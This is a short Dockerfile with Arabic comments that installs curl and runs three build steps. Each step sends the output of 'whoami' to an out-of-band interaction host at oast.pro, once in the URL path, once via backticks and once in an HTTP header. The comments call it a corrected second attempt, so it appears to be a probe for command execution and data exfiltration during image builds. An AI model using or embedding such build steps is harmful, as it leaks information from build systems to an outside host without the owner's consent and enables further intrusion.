FROM alpine:latest

# 1. نزل الأدوات
RUN apk add --no-cache curl

# 2. الكود المصحح (استخدمنا " " عشان نجبره يفك المتغير)
# بنستخدم $(whoami) جوه علامات تنصيص مزدوجة
RUN curl "http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/$(whoami)"

# 3. محاولة تانية باستخدام Backticks (عشان لو الأولى فشلت)
RUN curl "http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/`whoami`"

# 4. الهيدر (الطريقة الأضمن دايماً)
RUN curl -H "X-User: $(whoami)" "http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/header_final"
